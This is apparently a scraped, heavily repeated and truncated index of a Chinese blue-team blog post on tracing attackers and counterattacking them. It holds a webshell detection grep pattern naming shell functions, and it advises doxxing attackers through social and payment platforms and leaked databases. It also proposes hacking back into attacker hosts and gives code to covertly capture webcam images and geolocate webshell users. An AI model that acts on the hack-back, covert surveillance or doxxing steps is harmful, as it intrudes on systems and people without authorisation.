//360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#溯源流程"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#1信息查询"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#2定位目标利用精准ip定位进行ip目标位置的确定"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#3收集互联网信息侧的用户id"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ //360威胁情报平台 https://www.venuseye.com.cn/ //启明星辰威胁情报中心 https://community.riskiq.com/ //RiskIQ威胁情报平台 //ip查域名 https://www.ipip.net/ip.html //IPIP平台 https://www.aizhan.com/ //爱站 https://www.whois.com/ //whois查询 //IP定位 https://chaipip.com/ //高精度IP定位 2、定位目标：利用精准IP定位，进行IP目标位置的确定\r3、收集互联网信息侧的用户ID可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。 4、进入跳板机收集信息如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#4进入跳板机收集信息"},{"categories":["hvv"],"content":"\r邮件钓鱼攻击溯源：钓鱼邮件攻击通常分为两种：一种带有附件的word宏病毒，一种是引导受害者进入钓鱼网站来获取受害者的敏感信息。 获取信息：通过查看邮件原文，获取发送方IP地址、域名后缀邮箱、钓鱼网站或恶意附件样本等信息 对钓鱼网页的处理： 可以通过相关联的域名/IP进行追踪； 对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息； 对邮件附件的处理： 对附件进行逆向，看附件是否包含红队物理路径信息，会暴露其用户名ID 把附件放进云沙箱，提取C2域名 邮件导出为eml格式，提取发信人IP 尽可能多的诱导对方提供攻击样本和链接 通过SIEM策略加快查找： 同一个发件人，给超5个人发邮件的，筛出来 同一个标题邮件，日志数超过10条的，筛出来 所有对外公开的邮箱，逐一排查 所有带附件的邮箱，考虑到免杀，再人工排查一遍 获取到邮箱后： WHOIS反查域名 邮箱前缀可能是红队ID，搜索引擎反查 天眼查、企查查反查公司 reg007.com查注册过的网站，通过找回密码，进一步找信息 获取到手机号后： 查脉脉、领英，得到毕业院校、工作经历 查微博、知乎、github等社交账号 微信、支付宝转账，得到部分真实姓名 社工库查询 拿到域名后： WHOIS反查注册人，要是开启了隐私保护，就查域名历史IP解析，然后根据查到的IP，再继续查IP历史解析域名，总之套娃。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:2","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#邮件钓鱼攻击溯源"},{"categories":["hvv"],"content":"\rweb入侵溯源：**溯源方式：**隔离webshell样本，使用Web日志还原攻击路径，找到安全漏洞位置进行漏洞修复，从日志可以找到攻击者的IP地址，但攻击者一般都会使用代理服务器或匿名网络（例如Tor）来掩盖其真实的IP地址。 在入侵过程中，使用反弹shell、远程下载恶意文件、端口远程转发等方式，也容易触发威胁阻断，而这个域名/IP，提供一个反向信息收集和渗透测试的路径。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:5:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#web入侵溯源"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#溯源反制"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#ip定位法"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#蜜罐捕获法"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#常规渗透反打"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#ip有服务"},{"categories":["hvv"],"content":"\r溯源反制：\rIP定位法：未挂代理： 直接获取真实IP，直接获取物理定位信息 挂代理： ①傀儡机进行跳板攻击 对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP ②使用http代理或VPN/TOR多级代理 如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧…) 蜜罐捕获法：利用蜜罐获取攻击者信息： 攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID 常规渗透反打：\rIP有服务：IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等 通过现有的服务进行常规渗透测试，渗透服务器控制权限 IP无服务：端口探测，常规漏洞攻击 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:6:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#ip无服务"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： \u003chtml\u003e \u003chead\u003e \u003cscript\u003e function takePhoto() { // 获取video元素 const video = document.getElementById(\"video\"); // 创建一个canvas元素 const canvas = document.createElement(\"canvas\"); // 设置canvas元素的大小 canvas.width = video.videoWidth; canvas.height = video.videoHeight; // 将video图像画到canvas上 canvas.getContext(\"2d\").drawImage(video, 0, 0); // 将canvas元素转换为图片并显示 const image = new Image(); image.src = canvas.toDataURL(\"image/png\"); document.body.appendChild(image); } \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003c!-- 创建一个video元素 --\u003e \u003cvideo id=\"video\" width=\"640\" height=\"480\" autoplay\u003e\u003c/video\u003e \u003c!-- 创建一个按钮，点击拍照 --\u003e \u003cbutton onclick=\"takePhoto()\"\u003eTake Photo\u003c/button\u003e \u003c!-- 请求访问用户的摄像头 --\u003e \u003cscript\u003e // 创建一个MediaStream对象 const stream = navigator.mediaDevices.getUserMedia({ video: true }); // 将MediaStream对象绑定到video元素上 stream.then(function(mediaStream) { const video = document.getElementById(\"video\"); video.srcObject = mediaStream; }); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo '\u003cbr/\u003e'; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo '\u003cbr/\u003e'; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo '\u003cbr/\u003e'; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#webshell溯源反制"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#webshell查杀"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#工具查杀"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 